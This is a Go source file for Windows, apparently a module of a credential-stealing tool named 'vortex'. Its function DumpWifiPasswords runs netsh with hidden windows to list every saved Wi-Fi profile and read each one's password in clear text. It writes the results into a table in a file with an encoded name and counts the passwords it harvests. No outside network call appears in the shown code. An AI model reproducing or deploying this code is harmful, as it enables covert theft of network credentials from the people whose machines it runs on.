//go:build windows

package wifi

import (
	"bufio"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"vortex/encrypt"
	"vortex/hutil"

	"github.com/olekukonko/tablewriter"
)

func DumpWifiPasswords(mainFolder string) error {
	var out []string

	wifiOutFile := filepath.Join(mainFolder, encrypt.B64Util("wifi-creds.txt", 0))
	file, err := os.Create(wifiOutFile)
	if err != nil {
		return err
	}
	defer file.Close()

	creds := tablewriter.NewWriter(file)
	creds.SetHeader([]string{
		"Wifi Profile Name",
		"Wifi Profile Security",
		"Wifi Profile Password",
	})

	cmd := exec.Command("netsh", "wlan", "show", "profile")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	profiles, err := cmd.Output()
	if err != nil {
		return err
	}

	profileScanner := bufio.NewScanner(strings.NewReader(string(profiles)))
	for profileScanner.Scan() {
		if strings.Contains(profileScanner.Text(), "All User Profile") {
			profileName := strings.TrimLeft(strings.Split(profileScanner.Text(), ":")[1], " ")
			out = append(out, profileName)
			cmd = exec.Command("netsh", "wlan", "show", "profile", profileName, "key=clear")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			profile, err := cmd.Output()
			if err != nil {
				return err
			}
			profileInfoScanner := bufio.NewScanner(strings.NewReader(string(profile)))

			for profileInfoScanner.Scan() {
				if strings.Contains(profileInfoScanner.Text(), "Authentication") {
					out = append(out, strings.Split(profileInfoScanner.Text(), ":")[1])
				}
				if strings.Contains(profileInfoScanner.Text(), "Key Content") {
					out = append(out, strings.Split(profileInfoScanner.Text(), ":")[1])
					hutil.PasswordCounter++
				}
			}
		}
		creds.Append(out)
		out = nil
	}
	creds.Render()

	return nil
}
